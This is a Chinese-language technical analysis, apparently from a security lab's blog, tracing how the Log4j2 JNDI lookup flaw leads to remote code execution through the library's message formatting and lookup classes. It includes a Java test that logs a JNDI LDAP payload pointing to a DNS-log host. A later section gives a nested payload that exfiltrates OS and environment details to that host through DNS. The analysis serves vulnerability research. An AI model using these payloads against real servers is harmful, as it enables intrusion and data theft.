    public class Log4jTEst {
        public static void main(String[] args) {
            Logger logger = LogManager.getLogger(Log4jTEst.class);
            logger.error("${jndi:ldap://2lnhn2.ceye.io}");
        }
    }
直击漏洞本源，将断点断在`org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java`中的`directEncodeEvent`方法上，该方法的第一行代码将返回当前使用的布局，并调用
对应布局处理器的encode方法。log4j2默认缺省布局使用的是PatternLayout，如下图所示：
继续跟进在encode中会调用toText方法，根据注释该方法的作用为创建指定日志事件的文本表示形式，并将其写入指定的StringBuilder中。
接下来会调用`serializer.toSerializable`，并在这个方法中调用不同的Converter来处理传入的数据，如下图所示，
这里整理了一下调用的Converter
    org.apache.logging.log4j.core.pattern.DatePatternConverter
    org.apache.logging.log4j.core.pattern.LiteralPatternConverter
    org.apache.logging.log4j.core.pattern.ThreadNamePatternConverter
    org.apache.logging.log4j.core.pattern.LevelPatternConverter
    org.apache.logging.log4j.core.pattern.LoggerPatternConverter
    org.apache.logging.log4j.core.pattern.MessagePatternConverter
    org.apache.logging.log4j.core.pattern.LineSeparatorPatternConverter
    org.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverter
这么多Converter都将一个个通过上图中的for循环对日志事件进行处理，当调用到MessagePatternConverter时，我们跟入MessagePatternConverter.format()方法中一探究竟
在MessagePatternConverter.format()方法中对日志消息进行格式化，其中很明显的看到有针对字符"{"，这三行代码中关键点在于最后一行
这里我圈了几个重点，有助于理解Log4j2
为什么会用JndiLookup，它究竟想要做什么。此时的workingBuilder是一个StringBuilder对象，该对象存放的字符串如下所示
    09:54:48.329 [main] ERROR com.Test.log4j.Log4jTEst - ${jndi:ldap://2lnhn2.ceye.io}
本来这段字符串的长度是82，但是却给它改成了53，为什么呢？因为第五十三的位置就是`$`符号，也就是说`${jndi:ldap://2lnhn2.ceye.io}`这段不要了，从第53位开始append。而append的内容是什么呢？可以看到传入的参数是config.getStrSubstitutor().replace(event,
value)的执行结果，其中的value就是`${jndi:ldap://2lnhn2.ceye.io}`这段字符串。replace的作用简单来说就是想要进行一个替换，我们继续跟进
经过一段的嵌套调用，来到`Interpolator.lookup`，这里会通过`var.indexOf(PREFIX_SEPARATOR)`判断":"之前的字符，我们这里用的是jndi然后，就会获取针对jndi的Strlookup对象并调用Strlookup的lookup方法，如下图所示
那么总共有多少Strlookup的子类对象可供选择呢，可供调用的Strlookup都存放在当前Interpolator类的strLookupMap属性中，如下所示
然后程序的继续执行就会来到JndiLookup的lookup方法中，并调用jndiManager.lookup方法，如下图所示
说到这里，我们已经详细了解了logger.error()造成RCE的原理，那么问题就来了，logger有很多方法，除了error以外还别方法可以触发漏洞么？这里就要提到Log4j2的日志优先级问题，每个优先级对应一个数值`intLevel`记录在StandardLevel这个枚举类型中，数值越小优先级越高。如下图所示：
当我们执行Logger.error的时候，会调用Logger.logIfEnabled方法进行一个判断，而判断的依据就是这个日志优先级的数值大小
跟进isEnabled方法发现，只有当前日志优先级数值小于Log4j2的200的时候，程序才会继续往下走，如下所示
而这里日志优先级数值小于等于200的就只有"error"、"fatal"，这两个，所以logger.fatal()方法也可触发漏洞。但是"warn"、"info"等大于200的就触发不了了。
但是这里也说了是默认情况下，日志优先级是以error为准，Log4j2的缺省配置文件如下所示。
所以只需要做一点简单的修改，将``中的error改成一个优先级比较低的，例如"info"这样，只要日志优先级高于或者等于info的就可以触发漏洞，修改过后如下所示
关于Jndi部分的远程类加载利用可以参考实验室往常的文章：[Java反序列化过程中 RMI JRMP
以及JNDI多种利用方式详解](http://blog.topsec.com.cn/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%87%e7%a8%8b%e4%b8%ad-rmi-jrmp-%e4%bb%a5%e5%8f%8ajndi%e5%a4%9a%e7%a7%8d%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f%e8%af%a6%e8%a7%a3/
"Java反序列化过程中 RMI JRMP 以及JNDI多种利用方式详解")、[JAVA
JNDI注入知识详解](http://blog.topsec.com.cn/java-jndi%e6%b3%a8%e5%85%a5%e7%9f%a5%e8%af%86%e8%af%a6%e8%a7%a3/ "JAVA JNDI注入知识详解")
## 0x05 敏感数据带外
当目标服务器本身受到防护设备流量监控等原因，无法反弹shell的时候，Log4j2还可以通过修改payload，来外带一些敏感信息到dnslog服务器上，这里简单举一个例子，根据Apache
Log4j2官方提供的信息，获取环境变量信息除了jndi之外还有很多的选择可供使用，具体可查看前文给出的链接。根据文档中所述，我们可以用下面的方式来记录当前登录的用户名，如下所示
        %d %p %c{1.} [%t] $${env:USER} %m%n
获取java运行时版本，jvm版本，和操作系统版本，如下所示
        %d %m%n
类似的操作还有很多，感兴趣的同学可以去阅读下官方文档。
那么问题来了，如何将这些信息外带出去，这个时候就还要利用我们的dnsLog了，就像在sql注入中通过dnslog外带信息一样，payload改成以下形式
    "${jndi:ldap://${java:os}.2lnhn2.ceye.io}"
从表上看这个payload执行原理也不难，肯定是log4j2 递归解析了呗，为了严谨一下，就再废话一下log4j2解析这个payload的执行流程
首先还是来到MessagePatternConverter.format方法，然后是调用StrSubstitutor.replace方法进行字符串处理，如下图所示
只不过这次迭代处理先处理了"${java:os}",如下图所示
如此一来，就来到了JavaLookup.lookup方法中，并根据传入的参数来获取指定的值
解析完成后然后log4j2才会去解析外层的`${jndi:ldap://2lnhn2.ceye.io}`，最后请求的dnslog地址如下
如此一来，就实现了将敏感信息回显到dnslog上，利用的就是log4j2的递归解析，来dnslog上查看一下回显效果，如下所示